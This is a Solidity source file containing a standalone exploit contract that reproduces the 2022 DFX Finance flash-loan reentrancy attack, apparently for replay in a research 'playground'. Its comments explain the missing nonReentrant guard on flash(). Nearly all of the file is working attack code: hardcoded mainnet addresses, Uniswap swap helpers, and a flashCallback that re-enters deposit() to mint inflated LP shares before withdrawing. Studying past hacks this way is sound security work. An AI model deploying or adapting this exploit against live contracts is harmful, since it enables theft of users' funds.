// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-11-DFX).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// `ContractTest` (the `flashCallback` lives on the test itself, so there is no
// standalone contract to deploy). This contract is a faithful, self-contained
// copy of that inline attack (testExploit body + flashCallback + the three
// swap helpers), so the playground can deploy it and record run(). Logic and
// constants are copied verbatim from test/DFX_exp.sol.
//
// Root cause: DFX's `Curve` stableswap pool added a Uniswap-V3-style `flash()`
// loan with NO `nonReentrant` guard, while every other value-bearing entry
// point (deposit/withdraw/swap) IS guarded. flash() ships reserves out BEFORE
// the callback, so re-entering deposit() inside the callback mints LP shares
// against deflated balances — then withdraw() redeems them against the restored
// full pool. ~170,669 USDC profit in one tx.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ICurve {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
    function viewDeposit(uint256 _deposit) external view returns (uint256, uint256[] memory);
    function deposit(uint256 _deposit, uint256 _deadline) external returns (uint256, uint256[] memory);
    function withdraw(uint256 _curvesToBurn, uint256 _deadline) external;
}

interface IUniswapV3Router {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256);
}

interface IWETH {
    function deposit() external payable;
    function approve(address, uint256) external returns (bool);
}

contract DFXExploit {
    IERC20 constant XIDR = IERC20(0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV3Router constant Router = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    ICurve constant dfx = ICurve(0x46161158b1947D9149E066d6d31AF1283b2d377C);

    uint256 receiption;

    // Mirrors testExploit() body verbatim (the test starts with 2 ETH and wraps
    // it to WETH before swapping). run() is the recorded entrypoint; it receives
    // 2 ETH as msg.value (the recorder funds + sends it).
    function run() external payable {
        // Fund + wrap 2 ETH to WETH (test: `address(WETH).call{value: 2 ether}`).
        IWETH(address(WETH)).deposit{value: 2 ether}();

        // Approvals (copied from testExploit).
        WETH.approve(address(Router), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);
        USDC.approve(address(dfx), type(uint256).max);
        XIDR.approve(address(Router), type(uint256).max);
        XIDR.approve(address(dfx), type(uint256).max);

        // Step 0: swap 2 WETH -> USDC.
        wethToUSDC();
        // Step 1: swap half the USDC -> XIDR so we hold both tokens.
        usdcToXIDR();

        // Step 2: quote the deposit amounts.
        uint256[] memory xidrUsdc = new uint256[](2);
        xidrUsdc[0] = 0;
        xidrUsdc[1] = 0;
        (, xidrUsdc) = dfx.viewDeposit(200_000 * 1e18);

        // Step 3: flash(self, 99.5% of XIDR amount, 99.5% of USDC amount).
        // Re-enters deposit() in flashCallback (NO nonReentrant on flash()).
        dfx.flash(address(this), xidrUsdc[0] * 995 / 1000, xidrUsdc[1] * 995 / 1000, new bytes(1));

        // Step 4: withdraw the inflated LP against the RESTORED full pool.
        dfx.withdraw(receiption, block.timestamp + 60);

        // Step 5: unwind leftover XIDR -> USDC.
        xidrToUSDC();
    }

    // The reentrancy: deposit() inside the flash callback mints inflated LP
    // shares against the deflated pool balances. The deposit funds also repay
    // the flash's balanceAfter check.
    function flashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        (receiption,) = dfx.deposit(200_000 * 1e18, block.timestamp + 60);
    }

    function wethToUSDC() internal {
        IUniswapV3Router.ExactInputSingleParams memory params = IUniswapV3Router.ExactInputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(USDC),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: WETH.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(params);
    }

    function usdcToXIDR() internal {
        IUniswapV3Router.ExactInputSingleParams memory params = IUniswapV3Router.ExactInputSingleParams({
            tokenIn: address(USDC),
            tokenOut: address(XIDR),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: USDC.balanceOf(address(this)) / 2,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(params);
    }

    function xidrToUSDC() internal {
        IUniswapV3Router.ExactInputSingleParams memory params = IUniswapV3Router.ExactInputSingleParams({
            tokenIn: address(XIDR),
            tokenOut: address(USDC),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: XIDR.balanceOf(address(this)) / 2,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(params);
    }

    receive() external payable {}
}
